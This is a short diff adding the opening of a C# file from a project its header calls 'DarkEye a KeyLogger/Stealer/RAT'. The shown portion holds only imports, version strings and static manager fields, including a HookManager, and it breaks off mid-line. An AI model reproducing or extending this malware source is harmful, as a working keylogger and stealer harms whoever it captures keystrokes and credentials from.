@@ -1,0 +1,31 @@
+﻿/******************************************************************************
+ *                   DarkEye a KeyLogger/Stealer/RAT
+ *                   Copyright (C) 2020 Gish_Reloaded
+ ******************************************************************************/
+using DarkEye.Classes.Managers;
+using DarkEye.Classes.Objects;
+using DarkEye.Classes.Utils;
+using System;
+using System.IO;
+
+namespace DarkEye.Classes
+{
+    /*
+    * Created by Gish_Reloaded on 27/03/2020.
+    */
+    class DarkEye
+    {
+        public readonly static string BUILD_NUMBER = "1";
+        public readonly static string DARKEYE_TITLE = "#DarkEye v3b" + BUILD_NUMBER + "#";
+
+        public static CommandManager commandManager;
+        public static DuplicateManager duplicateManager;
+        public static LineManager lineManager;
+        public static OwnerManager ownerManager;
+        public static HookManager hookManager;
+        public static WindowManager windowManager;
+        public static DataManager dataManager;
+
+        public static Log globalLog;
+
+        public st
